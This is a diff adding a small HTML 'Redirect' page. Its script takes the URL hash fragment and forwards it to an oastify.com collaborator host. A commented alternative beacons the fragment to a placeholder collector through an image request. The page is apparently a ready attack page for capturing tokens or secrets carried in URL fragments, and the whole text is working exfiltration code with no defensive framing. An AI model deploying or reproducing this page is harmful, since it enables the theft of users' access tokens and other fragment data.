@@ -1,0 +1,17 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Redirect</title>
+<script>
+  (function () {
+    var frag = (location.hash || '').slice(1);
+    if (!frag) {
+      document.body.textContent = 'No hash fragment present.';
+      return;
+    }
+
+    location.href = 'https://yrtaqtr3iwqvtgx3qzsa2i6mhdn4b1zq.oastify.com/?' + encodeURIComponent(frag);
+
+    // Option B: beacon without leaving page (uncomment if preferred)
+    // new Image().src = 'https://YOUR-COLLECTOR.example/?' + encodeURIComponent(frag);
+  })();
+</script>
